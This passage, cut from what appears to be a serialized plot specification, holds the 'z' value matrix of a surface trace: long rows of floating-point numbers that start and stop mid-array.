0.5, \"type\": \"surface\", \"z\": [[0.0, 0.026055242866277695, 0.04022997245192528, 0.05251088738441467, 0.06562713533639908, 0.07416171580553055, 0.07613785564899445, 0.08059637248516083, 0.09204737097024918, 0.09904944151639938, 0.09571556001901627, 0.09230887144804001, 0.09290139377117157, 0.09146595001220703, 0.08939267694950104, 0.0962560698390007, 0.10929950326681137, 0.11750493943691254, 0.11423718184232712, 0.10703443735837936, 0.09551643580198288, 0.08632608503103256, 0.08489466458559036, 0.08530562371015549, 0.08050071448087692, 0.0744047611951828, 0.0690612867474556, 0.06286187469959259, 0.058912649750709534, 0.060203488916158676, 0.06716547161340714, 0.07752514630556107, 0.08719723671674728, 0.09266369044780731, 0.09848224371671677, 0.09973159432411194, 0.08974117040634155, 0.07921861112117767, 0.07526501268148422, 0.06853555142879486, 0.05042384937405586, 0.03243892639875412, 0.021982721984386444, 0.021562404930591583, 0.02184644713997841, 0.019358018413186073, 0.018009694293141365, 0.018917715176939964, 0.016203826293349266, 0.0071710217744112015], [-0.026055242866277695, 0.00041995063656941056, 0.018534695729613304, 0.033445097506046295, 0.04728320240974426, 0.05552302300930023, 0.05791836977005005, 0.06340236961841583, 0.07709035277366638, 0.08659420162439346, 0.08465413749217987, 0.08181660622358322, 0.08221908658742905, 0.0811559185385704, 0.07881534844636917, 0.08500505983829498, 0.09869761019945145, 0.10812710970640182, 0.10657580941915512, 0.10018885135650635, 0.08963074535131454, 0.08001133799552917, 0.07684739679098129, 0.0775923877954483, 0.07807464152574539, 0.07532712817192078, 0.06884092837572098, 0.056512508541345596, 0.049154289066791534, 0.05141661316156387, 0.06356098502874374, 0.07632580399513245, 0.08555798977613449, 0.08968787640333176, 0.09535565972328186, 0.09766744822263718, 0.09084900468587875, 0.0821353867650032, 0.07746076583862305, 0.06890217214822769, 0.04969275742769241, 0.031678907573223114, 0.021255772560834885, 0.02168227732181549, 0.02287125401198864, 0.022497165948152542, 0.02361089177429676, 0.02651228941977024, 0.023547792807221413, 0.01201237179338932], [-0.04022997245192528, -0.015869908034801483, 0.004046501126140356, 0.019712576642632484, 0.03261580318212509, 0.040521349757909775, 0.04386133700609207, 0.04880091920495033, 0.059581458568573, 0.06904041767120361, 0.06908419728279114, 0.06646276265382767, 0.06517716497182846, 0.06472375243902206, 0.06785295158624649, 0.07763173431158066, 0.08981431275606155, 0.09899599105119705, 0.10030091553926468, 0.0955020859837532, 0.08835869282484055, 0.07892902940511703, 0.07044269144535065, 0.06452414393424988, 0.06455692648887634, 0.06589563935995102, 0.06152625381946564, 0.049651455134153366, 0.04467020183801651, 0.050881341099739075, 0.06390656530857086, 0.0730731412768364, 0.07982494682073593, 0.08497647196054459, 0.09366340935230255, 0.09745436161756516, 0.09284249693155289, 0.08321795612573624, 0.07611706107854843, 0.06796100735664368, 0.052091483026742935, 0.03445092588663101, 0.019854338839650154, 0.016779199242591858, 0.01871057040989399, 0.021064776927232742, 0.0221742931753397, 0.02369670197367668, 0.020989084616303444, 0.014235000126063824], [-0.05251088738441467, -0.03058764711022377, -0.011285792104899883, 0.004609395284205675, 0.019002307206392288, 0.032178718596696854, 0.03867889195680618, 0.04281146451830864, 0.05065733194351196, 0.05872713401913643, 0.05931653454899788, 0.05686967819929123, 0.054996322840452194, 0.05466541647911072, 0.05727364495396614, 0.06476671993732452, 0.07478645443916321, 0.08335481584072113, 0.0862041711807251, 0.08280517905950546, 0.07932732254266739, 0.07285104691982269, 0.062344953417778015, 0.0518118254840374, 0.048994023352861404, 0.05138561129570007, 0.04915580898523331, 0.04140271618962288, 0.04111795872449875, 0.05025692284107208, 0.06010529026389122, 0.06467432528734207, 0.06966067850589752, 0.07570943981409073, 0.0865691751241684, 0.09175928682088852, 0.08831390738487244, 0.07817883044481277, 0.07030585408210754, 0.06403037160634995, 0.05182028189301491, 0.03505855053663254, 0.018868986517190933, 0.013864779844880104, 0.014247607439756393, 0.013883953914046288, 0.009955392219126225, 0.008961008861660957, 0.007778535597026348, 0.00669223815202713], [-0.06405401229858398, -0.044817209243774414, -0.027011284604668617, -0.010965337976813316, 0.0048823668621480465, 0.022596590220928192, 0.03258773684501648, 0.03766319155693054, 0.045194368809461594, 0.05254266783595085, 0.05409639701247215, 0.05392224341630936, 0.05309617891907692, 0.05193905904889107, 0.05025198683142662, 0.052699875086545944, 0.06033818796277046, 0.06669150292873383, 0.06809817254543304, 0.0653107538819313, 0.06418296694755554, 0.06062855198979378, 0.05037320777773857, 0.03994768485426903, 0.03761589899659157, 0.039092980325222015, 0.03696652501821518, 0.03313480690121651, 0.03666577488183975, 0.04693559184670448, 0.05492584779858589, 0.05815713852643967, 0.062445320188999176, 0.06693002581596375, 0.07696988433599472, 0.08323665708303452, 0.08092866092920303, 0.07210227847099304, 0.06536193192005157, 0.059751369059085846, 0.048820868134498596, 0.03414951264858246, 0.020879419520497322, 0.01622115634381771, 0.012652340345084667, 0.006802916061133146, -0.001976406667381525, -0.005365060642361641, -0.006811708211898804, -0.006987688131630421], [-0.06982800364494324, -0.05501371622085571, -0.039005525410175323, -0.022734303027391434, -0.008865753188729286, 0.005019799340516329, 0.017816506326198578, 0.02805187553167343, 0.03636198863387108, 0.04204057902097702, 0.0464484840631485, 0.051559120416641235, 0.051908597350120544, 0.04821821302175522, 0.04662412777543068, 0.05111408233642578, 0.057275768369436264, 0.06022525206208229, 0.05848219245672226, 0.05558350682258606, 0.05474691092967987, 0.05105288699269295, 0.04047675430774689, 0.032897111028432846, 0.033298902213573456, 0.03078330308198929, 0.026145564392209053, 0.02768516167998314, 0.03371873497962952, 0.041262246668338776, 0.04817251116037369, 0.05385565012693405, 0.0593767873942852, 0.06171039491891861, 0.06899785995483398, 0.07557418197393417, 0.07264307141304016, 0.0656294897198677, 0.06185838580131531, 0.055663589388132095, 0.04454009607434273, 0.03427698090672493, 0.02706841565668583, 0.02047918178141117, 0.00920513179153204, -0.0017767121316865087, -0.009153984487056732, -0.013078519143164158, -0.01612836867570877, -0.017208807170391083], [-0.07487376034259796, -0.06194769963622093, -0.0446578748524189, -0.02736714854836464, -0.01546410284936428, -0.006408232729882002, 0.006767454091459513, 0.020474158227443695, 0.030412273481488228, 0.03693469613790512, 0.044539276510477066, 0.05167168751358986, 0.051050059497356415, 0.0456680990755558, 0.04429169371724129, 0.05028655752539635, 0.055899728089571, 0.060351114720106125, 0.06141602620482445, 0.059054184705019, 0.057432934641838074, 0.05229679122567177, 0.041391387581825256, 0.03459673747420311, 0.03421667218208313, 0.028589127585291862, 0.0213151928037405, 0.02179461531341076, 0.02550065517425537, 0.029105709865689278, 0.03487466275691986, 0.042029183357954025, 0.04851573705673218, 0.05191168934106827, 0.05924078822135925, 0.06591796875, 0.06254572421312332, 0.05666443333029747, 0.054978787899017334, 0.05075771361589432, 0.042294759303331375, 0.03557251766324043, 0.030137380585074425, 0.019501402974128723, 0.003550246125087142, -0.010646109469234943, -0.017964312806725502, -0.022323669865727425, -0.02534671314060688, -0.02475357986986637], [-0.08252570778131485, -0.06960310786962509, -0.05037790536880493, -0.0328536257147789, -0.02135447785258293, -0.011373178102076054, 0.002447723411023617, 0.016338756307959557, 0.027599113062024117, 0.03653140738606453, 0.046524763107299805, 0.053653497248888016, 0.05217881128191948, 0.04653428867459297, 0.04337340220808983, 0.046872250735759735, 0.05157821625471115, 0.0589129664003849, 0.06443792581558228, 0.06261268258094788, 0.0614115335047245, 0.05813004449009895, 0.04861416667699814, 0.040615227073431015, 0.03619919344782829, 0.029406076297163963, 0.021199174225330353, 0.017083575949072838, 0.016170622780919075, 0.01617451198399067, 0.01915121264755726, 0.024815231561660767, 0.03120586648583412, 0.03781111165881157, 0.0470270998775959, 0.05320964753627777, 0.04993202164769173, 0.04395344480872154, 0.04200832173228264, 0.04015279933810234, 0.03624304011464119, 0.032157786190509796, 0.02659785933792591, 0.013697154819965363, -0.003134016878902912, -0.019525840878486633, -0.02982795424759388, -0.034727007150650024, -0.03677823394536972, -0.03457352891564369], [-0.088084876537323, -0.07578612864017487, -0.05709841474890709, -0.04281802475452423, -0.03314187005162239, -0.01978868618607521, -0.004940563812851906, 0.007052809465676546, 0.018830791115760803, 0.028256600722670555, 0.03774286434054375, 0.04659680277109146, 0.048513080924749374, 0.044407956302165985, 0.043924834579229355, 0.04732906445860863, 0.04915965721011162, 0.05503341555595398, 0.06027747318148613, 0.05677381157875061, 0.055452682077884674, 0.05831094831228256, 0.054589252918958664, 0.04679505527019501, 0.03715365380048752, 0.0297465231269598, 0.02284594252705574, 0.016386089846491814, 0.01210738718509674, 0.010056216269731522, 0.011346717365086079, 0.015726514160633087, 0.022168517112731934, 0.032199420034885406, 0.04068504646420479, 0.0432627908885479, 0.04044308140873909, 0.03302258625626564, 0.026294469833374023, 0.02177022024989128, 0.02305007353425026, 0.023692192509770393, 0.020470308139920235, 0.006326741073280573, -0.011361107230186462, -0.029226820915937424, -0.03904905915260315, -0.04057116061449051, -0.041110772639513016, -0.042343754321336746], [-0.09046395868062973, -0.08029993623495102, -0.06484664231538773, -0.05441025644540787, -0.04690436273813248, -0.033600304275751114, -0.019502811133861542, -0.0087891248986125, 0.004302168730646372, 0.013561315834522247, 0.021183570846915245, 0.032534483820199966, 0.03939448669552803, 0.038264013826847076, 0.042624615132808685, 0.04829484596848488, 0.04798632860183716, 0.05137592926621437, 0.05515177547931671, 0.0507231131196022, 0.047346021980047226, 0.05102177709341049, 0.05162586644291878, 0.04786542430520058, 0.041316475719213486, 0.03510859236121178, 0.029109148308634758, 0.023041727021336555, 0.018523870036005974, 0.01687413826584816, 0.018333228304982185, 0.02202541194856167, 0.026972169056534767, 0.032238349318504333, 0.034370578825473785, 0.03323265165090561, 0.0320943146944046, 0.02529216930270195, 0.015125075355172157, 0.007106577046215534, 0.010151741094887257, 0.013506179675459862, 0.012705199420452118, -0.0009012600639835, -0.01893707551062107, -0.03631623089313507, -0.042546845972537994, -0.03971286118030548, -0.038343481719493866, -0.04207237809896469], [-0.09077435731887817, -0.08231694251298904, -0.0687052384018898, -0.05957259237766266, -0.05276624113321304, -0.041519686579704285, -0.02901371568441391, -0.018739284947514534, -0.00591065501794219, 0.0017778686014935374, 0.0072633964009583, 0.019196463748812675, 0.028874075040221214, 0.030982285737991333, 0.0375741571187973, 0.04428459331393242, 0.04408830404281616, 0.04776005446910858, 0.052792880684137344, 0.04995068535208702, 0.04597831889986992, 0.0473640002310276, 0.04890179634094238, 0.04874878749251366, 0.04780099540948868, 0.04237278550863266, 0.035111457109451294, 0.028654644265770912, 0.025043245404958725, 0.025274259969592094, 0.028360286727547646, 0.03186643496155739, 0.03472950682044029, 0.033870160579681396, 0.03086530603468418, 0.028118308633565903, 0.028084469959139824, 0.023532142862677574, 0.014101946726441383, 0.005942619871348143, 0.00784363690763712, 0.010294768959283829, 0.00926344096660614, -0.0036943024024367332, -0.021428413689136505, -0.03778437525033951, -0.04219385236501694, -0.037913620471954346, -0.035140130668878555, -0.03759804368019104], [-0.09331303089857101, -0.08199037611484528, -0.06908777356147766, -0.06161000579595566, -0.053420402109622955, -0.040489863604307175, -0.029524780809879303, -0.022714819759130478, -0.014929833821952343, -0.009060164913535118, -0.004099735990166664, 0.009030456654727459, 0.02217957004904747, 0.0285332053899765, 0.03346157446503639, 0.03910748288035393, 0.04303692281246185, 0.04606693983078003, 0.0470486581325531, 0.04664698243141174, 0.04791613295674324, 0.05116475373506546, 0.05129534751176834, 0.05082554742693901, 0.052964482456445694, 0.04828328639268875, 0.04033626616001129, 0.03302232176065445, 0.028018547222018242, 0.028673525899648666, 0.0347534604370594, 0.0381692573428154, 0.03857777640223503, 0.038226496428251266, 0.035453274846076965, 0.030527153983712196, 0.027912143617868423, 0.027193179354071617, 0.022840920835733414, 0.01616734080016613, 0.012079176492989063, 0.01026392076164484, 0.00813800748437643, -0.0002964673622045666, -0.01465329248458147, -0.027299143373966217, -0.03292121738195419, -0.03336697071790695, -0.031994741410017014, -0.03215336427092552], [-0.09325568377971649, -0.07955029606819153, -0.06902336329221725, -0.06340795755386353, -0.05293617025017738, -0.03609658405184746, -0.025217384099960327, -0.021315479651093483, -0.016835026443004608, -0.010872251354157925, -0.005701255984604359, 0.004302559420466423, 0.015898684039711952, 0.0248965285718441, 0.02947973646223545, 0.03618287667632103, 0.044713858515024185, 0.04845569282770157, 0.04693271219730377, 0.049098506569862366, 0.05606602877378464, 0.06213896721601486, 0.06041654199361801, 0.05568471550941467, 0.05329429730772972, 0.0472627654671669, 0.03995650261640549, 0.03403420001268387, 0.027598680928349495, 0.026938553899526596, 0.034497711807489395, 0.037609297782182693, 0.03688732162117958, 0.04215070605278015, 0.044202715158462524, 0.03889020159840584, 0.033213596791028976, 0.034598492085933685, 0.034789618104696274, 0.031510744243860245, 0.02451963722705841, 0.01937112770974636, 0.013122878037393093, 0.004149156156927347, -0.00791015475988388, -0.016132177785038948, -0.021536555141210556, -0.02697569690644741, -0.02858850173652172, -0.028658192604780197], [-0.09178968518972397, -0.07910966128110886, -0.07093986123800278, -0.06553258746862411, -0.05387589707970619, -0.0365971140563488, -0.025870244950056076, -0.021652625873684883, -0.014702841639518738, -0.006909339223057032, -0.0021609500981867313, 0.003290393855422735, 0.010879430919885635, 0.019992133602499962, 0.027182038873434067, 0.03716730698943138, 0.047237176448106766, 0.05389194190502167, 0.055912867188453674, 0.06002872809767723, 0.06707712262868881, 0.07131654769182205, 0.0684373676776886, 0.06143951043486595, 0.05533495917916298, 0.04790012910962105, 0.04110413044691086, 0.03692949563264847, 0.030154293403029442, 0.0279538594186306, 0.03490055724978447, 0.037893205881118774, 0.037109069526195526, 0.043422866612672806, 0.04783966392278671, 0.045311637222766876, 0.04148939624428749, 0.043578438460826874, 0.04410574212670326, 0.04312834516167641, 0.038444600999355316, 0.03341098874807358, 0.023801814764738083, 0.010455261915922165, -0.0020712774712592363, -0.008753273636102676, -0.012639804743230343, -0.019233886152505875, -0.0226029884070158, -0.023625949397683144], [-0.09297418594360352, -0.08121377229690552, -0.07260532677173615, -0.06422293931245804, -0.05140295252203941, -0.0391601026058197, -0.031003644689917564, -0.024467013776302338, -0.013530217111110687, -0.005538587458431721, -0.0017330573173239827, 0.00400075688958168, 0.011075487360358238, 0.01824997179210186, 0.02828759141266346, 0.04205707088112831, 0.05134645476937294, 0.0586298331618309, 0.06214211508631706, 0.06561016291379929, 0.07163340598344803, 0.07639895379543304, 0.07381328195333481, 0.06727400422096252, 0.06082746759057045, 0.051316238939762115, 0.04237395152449608, 0.03749625384807587, 0.03047827258706093, 0.027304403483867645, 0.035579536110162735, 0.04119955375790596, 0.04086552560329437, 0.04284040629863739, 0.04611074551939964, 0.04803871363401413, 0.04765947163105011, 0.04801969230175018, 0.046009574085474014, 0.044999729841947556, 0.04324386268854141, 0.04015640169382095, 0.03368491306900978, 0.02363380789756775, 0.012302697636187077, 0.005156318657100201, -0.0012268300633877516, -0.010765810497105122, -0.018938738852739334, -0.022702453657984734], [-0.0981902927160263, -0.0874277874827385, -0.07821350544691086, -0.06693173199892044, -0.0524975024163723, -0.041942764073610306, -0.034699197858572006, -0.027153203263878822, -0.016928918659687042, -0.011742213740944862, -0.007640343625098467, 0.003886755555868149, 0.014621039852499962, 0.018969185650348663, 0.027393288910388947, 0.04031873866915703, 0.047836776822805405, 0.055072132498025894, 0.05906321480870247, 0.06066914647817612, 0.06636039912700653, 0.07457049190998077, 0.07397085428237915, 0.07062772661447525, 0.06782622635364532, 0.05749291554093361, 0.046565864235162735, 0.041788484901189804, 0.03591140732169151, 0.0315973162651062, 0.03672797605395317, 0.04200557991862297, 0.04225054010748863, 0.04297475516796112, 0.046742603182792664, 0.05196549370884895, 0.05394848436117172, 0.05148962140083313, 0.045942049473524094, 0.04224398732185364, 0.04141828417778015, 0.041243452578783035, 0.040320802479982376, 0.03605598956346512, 0.027183255180716515, 0.02000340074300766, 0.010596687905490398, -0.0026778976898640394, -0.016613813117146492, -0.023491838946938515], [-0.0994970053434372, -0.0904337540268898, -0.08407188206911087, -0.07402196526527405, -0.05915060639381409, -0.0452658049762249, -0.0370200052857399, -0.03144196793437004, -0.024558186531066895, -0.02065381035208702, -0.014803354628384113, -0.001234514405950904, 0.009789778850972652, 0.012434323318302631, 0.017930878326296806, 0.028576979413628578, 0.03616497665643692, 0.04540769010782242, 0.05153397098183632, 0.052578628063201904, 0.05771414563059807, 0.06682367622852325, 0.06823951750993729, 0.06775781512260437, 0.0675964504480362, 0.05834248661994934, 0.04908403754234314, 0.04862910881638527, 0.04609598591923714, 0.04162457212805748, 0.04090186581015587, 0.04170173034071922, 0.04117728769779205, 0.04532008245587349, 0.05168668180704117, 0.05653401464223862, 0.05789082124829292, 0.054025888442993164, 0.04693574830889702, 0.0418706014752388, 0.04111996665596962, 0.04295094683766365, 0.04263419285416603, 0.03780593350529671, 0.03079889342188835, 0.02637338638305664, 0.018849339336156845, 0.0044267610646784306, -0.011651703156530857, -0.019625937566161156], [-0.09852036833763123, -0.09228135645389557, -0.09079599380493164, -0.08205940574407578, -0.06647083163261414, -0.05008384585380554, -0.04041314125061035, -0.03600125014781952, -0.03562293201684952, -0.03500567376613617, -0.02674918808043003, -0.012534177862107754, -0.003408940974622965, -0.0018291014712303877, 0.006128213834017515, 0.018860772252082825, 0.02579977922141552, 0.035555168986320496, 0.043626148253679276, 0.044093187898397446, 0.0454300157725811, 0.051413096487522125, 0.05582275241613388, 0.05859878286719322, 0.06078687682747841, 0.05588528513908386, 0.05065291374921799, 0.052964936941862106, 0.05545354261994362, 0.055715207010507584, 0.05136663094162941, 0.04520421847701073, 0.0418996661901474, 0.048492588102817535, 0.057535383850336075, 0.06134963408112526, 0.06132876127958298, 0.054554395377635956, 0.044839706271886826, 0.03927752748131752, 0.03859790414571762, 0.03936714306473732, 0.03965035080909729, 0.036339130252599716, 0.030069028958678246, 0.025129936635494232, 0.020747793838381767, 0.011381363496184349, -0.00042309198761358857, -0.010258080437779427], [-0.09594127535820007, -0.09131953120231628, -0.09046141058206558, -0.08054814487695694, -0.06609367579221725, -0.056757133454084396, -0.050428345799446106, -0.044992007315158844, -0.045448679476976395, -0.04476354271173477, -0.03461936116218567, -0.02055094949901104, -0.01380973681807518, -0.01275604497641325, -0.0018348883604630828, 0.012520479038357735, 0.017836369574069977, 0.025448698550462723, 0.03286908566951752, 0.03237375244498253, 0.03148316964507103, 0.037484850734472275, 0.04579710215330124, 0.050072357058525085, 0.05160228908061981, 0.0514378547668457, 0.04928349703550339, 0.04805144667625427, 0.05319232866168022, 0.06143862009048462, 0.06168163940310478, 0.0523245744407177, 0.04489817097783089, 0.047212421894073486, 0.05485576391220093, 0.058648671954870224, 0.06017712876200676, 0.05247088521718979, 0.04033380374312401, 0.034932348877191544, 0.034166622906923294, 0.0319150947034359, 0.035084061324596405, 0.037989117205142975, 0.03221726045012474, 0.02362525649368763, 0.020601950585842133, 0.01892462745308876, 0.01570400781929493, 0.006303683388978243], [-0.09207430481910706, -0.08771320432424545, -0.08497509360313416, -0.07447654753923416, -0.06248466670513153, -0.06067414581775665, -0.05854007601737976, -0.05224952846765518, -0.04826263338327408, -0.04486196115612984, -0.03539451211690903, -0.0222037211060524, -0.01619892008602619, -0.01552564837038517, -0.007823719643056393, 0.002764605451375246, 0.007405424956232309, 0.0140878576785326, 0.020192285999655724, 0.01845412515103817, 0.019418606534600258, 0.030361443758010864, 0.0409713089466095, 0.04508759081363678, 0.04494002088904381, 0.045961644500494, 0.04459834843873978, 0.040890883654356, 0.04610591381788254, 0.0572572760283947, 0.06188332661986351, 0.053840186446905136, 0.04494157433509827, 0.04353521391749382, 0.049334436655044556, 0.05425316467881203, 0.05929284170269966, 0.05420646816492081, 0.04235706105828285, 0.03687557578086853, 0.03505836799740791, 0.030884157866239548, 0.03399307280778885, 0.0386255644261837, 0.03388522192835808, 0.025632906705141068, 0.0245208702981472, 0.026608889922499657, 0.0281198862940073, 0.02220214530825615], [-0.09168050438165665, -0.08725009113550186, -0.08140534907579422, -0.07223325222730637, -0.06381628662347794, -0.06232098489999771, -0.058773789554834366, -0.052490122616291046, -0.048636216670274734, -0.04584726691246033, -0.03729429841041565, -0.02333236299455166, -0.014937303029000759, -0.01347763929516077, -0.011749236844480038, -0.006574684754014015, -0.0003280762757640332, 0.004954494535923004, 0.006421316415071487, 0.003880245378240943, 0.0068962182849645615, 0.021648524329066277, 0.03518189862370491, 0.041780985891819, 0.042571935802698135, 0.04471466317772865, 0.04456271603703499, 0.03825868293642998, 0.03940412402153015, 0.047918081283569336, 0.05416955426335335, 0.050320353358983994, 0.043129339814186096, 0.04234478995203972, 0.049074240028858185, 0.05590178817510605, 0.06312981247901917, 0.05909934267401695, 0.047757092863321304, 0.03813140466809273, 0.03359822556376457, 0.030985258519649506, 0.03369079530239105, 0.03772416710853577, 0.036059632897377014, 0.030715003609657288, 0.03007102757692337, 0.034203559160232544, 0.03764840215444565, 0.03253740444779396], [-0.09120375663042068, -0.08627336472272873, -0.0777694508433342, -0.0716853067278862, -0.06786458194255829, -0.06258704513311386, -0.05395173653960228, -0.04797634482383728, -0.0472407303750515, -0.046633560210466385, -0.0385688878595829, -0.02639753557741642, -0.01748201996088028, -0.014708307571709156, -0.015461289323866367, -0.011180618777871132, -0.0018121326575055718, 0.002764658536761999, -0.0004342917527537793, -0.0025117502082139254, -0.001198957790620625, 0.009518858045339584, 0.02524326741695404, 0.03659098222851753, 0.04037630185484886, 0.04439741373062134, 0.048558205366134644, 0.04542570188641548, 0.041690099984407425, 0.04299182444810867, 0.047237578779459, 0.0488937646150589, 0.04579191654920578, 0.04604984074831009, 0.05293915048241615, 0.06044849380850792, 0.06564400345087051, 0.05909315496683121, 0.04864329844713211, 0.036607060581445694, 0.0339164137840271, 0.037062760442495346, 0.03889015316963196, 0.03933791443705559, 0.04125852510333061, 0.03920489177107811, 0.03677574172616005, 0.041609592735767365, 0.0453401543200016, 0.03875826671719551], [-0.08562473952770233, -0.07887572795152664, -0.06875122338533401, -0.06341878324747086, -0.06278788298368454, -0.06193358823657036, -0.05472376197576523, -0.04768393933773041, -0.04253038391470909, -0.03794076293706894, -0.02925124019384384, -0.021920498460531235, -0.01778523251414299, -0.016076017171144485, -0.016781816259026527, -0.012357883155345917, -0.003930851351469755, 0.0012488483916968107, -0.0007962698000483215, -0.0022417439613491297, -0.003226857865229249, 0.0030302973464131355, 0.018571509048342705, 0.030745074152946472, 0.03440583124756813, 0.039985157549381256, 0.04861463978886604, 0.05161665380001068, 0.04760724678635597, 0.04572056606411934, 0.049300435930490494, 0.054047781974077225, 0.053488731384277344, 0.05036058649420738, 0.05271054059267044, 0.057636700570583344, 0.059985920786857605, 0.05264309048652649, 0.044487081468105316, 0.03852260857820511, 0.04391811043024063, 0.05130113288760185, 0.05186037719249725, 0.04837764427065849, 0.04970134049654007, 0.047275055199861526, 0.04341382533311844, 0.04806576296687126, 0.053017329424619675, 0.04840881749987602], [-0.07669571787118912, -0.06932738423347473, -0.061256006360054016, -0.05655977129936218, -0.05638367682695389, -0.05869641155004501, -0.05562547594308853, -0.0493277981877327, -0.03783825412392616, -0.02705148234963417, -0.01775069162249565, -0.012403417378664017, -0.010334284044802189, -0.009905995801091194, -0.010736248455941677, -0.009037443436682224, -0.004990905988961458, 0.00043712626211345196, 0.002041056053712964, 0.000649818335659802, -0.000744409509934485, 0.003820844693109393, 0.01580667309463024, 0.025167196989059448, 0.027825992554426193, 0.033011361956596375, 0.043040644377470016, 0.0530368909239769, 0.05307585746049881, 0.05087845399975777, 0.052383050322532654, 0.05731545016169548, 0.05912569910287857, 0.054139088839292526, 0.0519498735666275, 0.05284230038523674, 0.052303340286016464, 0.046679358929395676, 0.04254201054573059, 0.04636763781309128, 0.06047918274998665, 0.07007426768541336, 0.07029417902231216, 0.06368192285299301, 0.06098531186580658, 0.055162250995635986, 0.05030183121562004, 0.0535692535340786, 0.05866939574480057, 0.05583047866821289], [-0.0729847252368927, -0.06627751141786575, -0.060923002660274506, -0.055942218750715256, -0.052458181977272034, -0.05029137060046196, -0.05055646598339081, -0.048628997057676315, -0.03625908121466637, -0.022920828312635422, -0.014244960620999336, -0.005860988982021809, 0.0002927382884081453, 0.0006329523748718202, 0.0008162409067153931, -0.001356674823909998, -0.003400831250473857, 0.000570911739487201, 0.005046964623034, 0.002499207155779004, 0.0031330420169979334, 0.009684992022812366, 0.01530527975410223, 0.021380295976996422, 0.027893193066120148, 0.03172903507947922, 0.03678886592388153, 0.04699130356311798, 0.051794104278087616, 0.052282728254795074, 0.0529540479183197, 0.05714196339249611, 0.06190577521920204, 0.06224436312913895, 0.0605805367231369, 0.05793825536966324, 0.0548381544649601, 0.05283903330564499, 0.053501203656196594, 0.06164689362049103, 0.07500611990690231, 0.08310738205909729, 0.08613929152488708, 0.08094499260187149, 0.07263990491628647, 0.06173664703965187, 0.05724301189184189, 0.059183329343795776, 0.0626583844423294, 0.05811070278286934], [-0.0744047611951828, -0.06661121547222137, -0.05778292194008827, -0.05132988467812538, -0.04773930087685585, -0.04542621597647667, -0.04725547507405281, -0.04670099541544914, -0.03511865437030792, -0.021753735840320587, -0.013384822756052017, -0.004892658907920122, 0.0018393161008134484, 0.0022901413030922413, 0.004756948910653591, 0.003932665567845106, 0.0012662606313824654, 0.005272942595183849, 0.010530304163694382, 0.00753386365249753, 0.008879357017576694, 0.015481129288673401, 0.01711242087185383, 0.021632038056850433, 0.031617533415555954, 0.0358281210064888, 0.037016693502664566, 0.0413917601108551, 0.04614898934960365, 0.05020054802298546, 0.056598324328660965, 0.06380542367696762, 0.07010508328676224, 0.07445313781499863, 0.07551109790802002, 0.07358115166425705, 0.07119590789079666, 0.07133517414331436, 0.07367874681949615, 0.07811740040779114, 0.08475753664970398, 0.09061884135007858, 0.09584487974643707, 0.09367965906858444, 0.08382481336593628, 0.07081098109483719, 0.0655776634812355, 0.06586182862520218, 0.06731721013784409, 0.06077421456575394], [-0.07587684690952301, -0.06611280143260956, -0.051968950778245926, -0.04477093368768692, -0.04352341964840889, -0.042962729930877686, -0.04382461681962013, -0.04227077215909958, -0.03306322917342186, -0.021503811702132225, -0.012938950210809708, -0.0062689101323485374, -0.0008781708311289549, 0.0003584538062568754, 0.0033832434564828873, 0.0046615940518677235, 0.005580609664320946, 0.012767360545694828, 0.019537631422281265, 0.017403189092874527, 0.01878228783607483, 0.02311268262565136, 0.02186591923236847, 0.02347494661808014, 0.03254484385251999, 0.038361016660928726, 0.040484435856342316, 0.04229145869612694, 0.04571910947561264, 0.05153011158108711, 0.0618261881172657, 0.07155729085206985, 0.0787208303809166, 0.08627744764089584, 0.0906672403216362, 0.0908808633685112, 0.08989408612251282, 0.08990921080112457, 0.09168842434883118, 0.09303510189056396, 0.09555669128894806, 0.09904012829065323, 0.10379011929035187, 0.1047229990363121, 0.09707741439342499, 0.08443465828895569, 0.07497173547744751, 0.07071534544229507, 0.0687241181731224, 0.06253049522638321], [-0.07319462299346924, -0.062826968729496, -0.048564281314611435, -0.04408793896436691, -0.045538391917943954, -0.043133657425642014, -0.03814995661377907, -0.03376597538590431, -0.02878376469016075, -0.021158842369914055, -0.012712196446955204, -0.00748506560921669, -0.001857266528531909, 0.001986609073355794, 0.0019442117772996426, 0.002753452630713582, 0.010561231523752213, 0.02138751931488514, 0.027005566284060478, 0.026253320276737213, 0.02881169319152832, 0.03080877475440502, 0.027651382610201836, 0.02437628246843815, 0.028563907369971275, 0.03736506402492523, 0.0457790307700634, 0.0511152483522892, 0.053433772176504135, 0.058376461267471313, 0.06667688488960266, 0.07588353753089905, 0.08315637707710266, 0.09333010762929916, 0.10040496289730072, 0.1022476926445961, 0.10302799195051193, 0.10145317018032074, 0.10058818757534027, 0.10383369773626328, 0.10864445567131042, 0.10929521173238754, 0.10910472273826599, 0.1120331659913063, 0.11019075661897659, 0.10265932232141495, 0.08826731890439987, 0.07596635073423386, 0.06657232344150543, 0.06121792271733284], [-0.06671939045190811, -0.05787954851984978, -0.048358287662267685, -0.04684760048985481, -0.04887625575065613, -0.045718543231487274, -0.037592001259326935, -0.030020520091056824, -0.022300487384200096, -0.014608645811676979, -0.0084692919626832, -0.00683223083615303, -0.0025493763387203217, 0.0031190013978630304, 0.004004475194960833, 0.0071013993583619595, 0.018455905839800835, 0.02695881389081478, 0.026438452303409576, 0.02489495649933815, 0.028023336082696915, 0.030205681920051575, 0.028155677020549774, 0.025035260245203972, 0.02900056540966034, 0.0387614369392395, 0.048804737627506256, 0.055092547088861465, 0.05742063373327255, 0.06365776807069778, 0.07444658130407333, 0.08461607247591019, 0.09023047983646393, 0.09622693806886673, 0.10086056590080261, 0.10351927578449249, 0.10706273466348648, 0.10613041371107101, 0.10347005724906921, 0.10851199179887772, 0.11616918444633484, 0.11651153117418289, 0.112851083278656, 0.11410123109817505, 0.11447994410991669, 0.1126314029097557, 0.10224220901727676, 0.0888015404343605, 0.07546214014291763, 0.06754584610462189], [-0.06309422850608826, -0.055820535868406296, -0.05093444883823395, -0.05011000484228134, -0.050150834023952484, -0.047380752861499786, -0.03994423523545265, -0.030525827780365944, -0.01758396439254284, -0.007890701293945312, -0.0047643352299928665, -0.007697308901697397, -0.005726831499487162, 0.0009259398793801665, 0.007174248807132244, 0.014608415775001049, 0.02464316412806511, 0.02620958350598812, 0.018948616459965706, 0.0166443083435297, 0.02155260555446148, 0.0273492019623518, 0.02894843928515911, 0.02941272221505642, 0.03579104319214821, 0.044749900698661804, 0.052320681512355804, 0.056004736572504044, 0.05832286924123764, 0.06641313433647156, 0.08016319572925568, 0.09082683175802231, 0.09447242319583893, 0.09527291357517242, 0.09664587676525116, 0.09979182481765747, 0.1064046323299408, 0.10812979936599731, 0.10506080090999603, 0.10902076214551926, 0.1166270524263382, 0.11900096386671066, 